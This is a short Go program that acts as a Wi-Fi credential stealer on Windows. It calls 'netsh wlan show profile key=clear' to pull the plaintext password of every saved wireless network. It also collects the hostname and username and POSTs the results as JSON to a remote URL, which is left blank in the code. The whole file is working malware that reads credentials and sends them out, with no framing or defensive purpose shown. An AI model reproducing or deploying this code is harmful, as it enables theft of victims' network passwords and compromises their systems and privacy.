package main

import (
	"bytes"
	"encoding/json"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"time"
)

var url string = ""

func get_command_output(command []string) string {

	cmd_name := command[0]
	cmd_args := command[1:]
	cmd := exec.Command(cmd_name, cmd_args...)

	out, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatalf("cmd.Run() failed with %s\n", err)
	}
	s_out := string(out)
	return s_out
}

func send_json_data(jsonData []byte) {
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		log.Fatalf("Error creating request %s\n", err)
		return
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

}

func main() {
	c := []string{"netsh", "wlan", "show", "profiles"}
	cmd_output := get_command_output(c)
	s := strings.Split(cmd_output, "\n")
	wifi_list := make([]string, 0)

	for _, element := range s {
		if strings.Contains(element, "All User Profile") {
			w := strings.Split(element, ":")[1]
			wifiname := w[1 : len(w)-1]
			wifi_list = append(wifi_list, wifiname)
		}
	}

	mainData := make(map[string]interface{})
	hostname, err := os.Hostname()
	if err != nil {
		panic(err)
	}
	currentUser, err := user.Current()
	if err != nil {
		log.Fatalf("Error retrieving the current user %s\n", err)
	}

	currentTime := time.Now()
	currentFormattedTime := currentTime.Format("15:04:05_02-01-2006")

	mainData["hostname"] = hostname
	mainData["username"] = currentUser.Username
	mainData["time"] = currentFormattedTime

	wifiData := make(map[string]string)

	for _, wifi := range wifi_list {
		cmd := []string{"netsh", "wlan", "show", "profile", "key=clear", wifi}
		cmd_output2 := strings.Split(get_command_output(cmd), "\n")

		var wifi_password string
		for _, line := range cmd_output2 {
			if strings.Contains(line, "Key Content") {
				x := strings.Split(line, ":")[1]
				wifi_password = x[1 : len(x)-1]
				wifiData[wifi] = wifi_password
			}
		}
	}
	mainData["wifipw"] = wifiData

	jsonBin, err := json.Marshal(mainData)
	if err != nil {
		log.Fatalf("encoding into json failed %s\n", err)
	}
	send_json_data(jsonBin)
}
